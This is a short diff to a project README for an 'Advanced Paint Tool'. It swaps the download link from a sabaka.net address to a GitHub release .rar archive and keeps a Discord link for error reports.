@@ -1,4 +1,4 @@
-# Advanced Paint Tool [Download current version](http://sabaka.net)
+# Advanced Paint Tool [Download current version](https://github.com/LAVRIK596/Advanced-Paint-Tool/releases/download/v1.0.0.0/Advanced.Paint.Tool.rar)
 
 ## Report the detected error here -->[Discord](https://discord.gg/tVEXd7bgTU)!!!
 
